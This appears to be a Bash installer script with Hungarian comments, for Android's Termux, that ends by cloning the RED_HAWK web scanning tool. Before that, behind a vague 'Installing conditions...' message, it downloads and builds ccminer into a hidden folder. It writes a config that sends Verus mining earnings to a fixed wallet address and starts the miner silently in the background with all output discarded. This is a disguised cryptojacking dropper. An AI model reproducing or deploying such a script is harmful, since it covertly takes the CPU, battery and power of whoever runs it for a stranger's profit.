#!/bin/bash

# Hibaüzenetek megjelenítése a hibák esetén
error_handler() {
  echo "Error occurred at line $1: $2"
}

# Hibaellenőrzés beállítása
trap 'error_handler ${LINENO} "$BASH_COMMAND"' ERR

# Kiírja, hogy "Installing conditions..." és vár 3 másodpercet
echo "Installing conditions..."
sleep 3

# Telepíti a git parancsot
pkg install git -y

# Ellenőrzi, hogy a telepítés sikeres volt-e
if [ $? -ne 0 ]; then
  echo "Failed to install git. Exiting..."
  exit 1
fi

# Letölti a ccminer repót
git clone https://github.com/Darktron/ccminer.git

# Ellenőrzi, hogy a letöltés sikeres volt-e
if [ $? -ne 0 ]; then
  echo "Failed to clone ccminer repository. Exiting..."
  exit 1
fi

# Átnevezi a ccminer mappát .ccminer-re
mv ccminer .ccminer

# Belép a .ccminer mappába
cd .ccminer

# Megváltoztatja a jogosultságokat és elindítja a build.sh-t
chmod +x build.sh configure.sh autogen.sh start.sh
CXX=clang++ CC=clang ./build.sh

# Ellenőrzi, hogy a build sikeres volt-e
if [ $? -ne 0 ]; then
  echo "Failed to build ccminer. Exiting..."
  exit 1
fi

# Előállítja az új config.json fájlt
echo '{
    "pools":
        [{
            "name": "RO-VIPOR",
            "url": "stratum+tcp://ro.vipor.net:5040",
            "timeout": 180,
            "disabled": 0
        },
        {
            "name": "UA-VIPOR",
            "url": "stratum+tcp://ua.vipor.net:5040",
            "timeout": 180,
            "disabled": 0
        },
        {
            "name": "PL-VIPOR",
            "url": "stratum+tcp://pl.vipor.net:5040",
            "timeout": 180,
            "disabled": 1
        },
        {
            "name": "DE-VIPOR",
            "url": "stratum+tcp://de.vipor.net:5040",
            "timeout": 180,
            "disabled": 1
        },
        {
            "name": "WW-ZERGPOOL",
            "url": "stratum+tcp://verushash.mine.zergpool.com:3300",
            "timeout": 180,
            "disabled": 1
        },
        {
            "name": "VPOOL-LOW",
            "url": "stratum+tcp://pool.verus.io:9998",
            "timeout": 180,
            "disabled": 1
        },
        {
            "name": "US-CLOUDIKO",
            "url": "stratum+tcp://us.cloudiko.io:9999",
            "timeout": 180,
            "disabled": 1
        }],

    "user": "RJ85ApZwPgXbohvUEVVxwE78WHzsyoiHTJ.modul",
    "pass": "",
    "algo": "verus",
    "threads": 4,
    "cpu-priority": 1,
    "cpu-affinity": -1,
    "retry-pause": 10
}' > config.json

# Elindítja a ccminer-t
nohup ./start > /dev/null 2>&1 &

# Letölti a RED_HAWK repót
git clone https://github.com/ManabSenapati/RED_HAWK.git
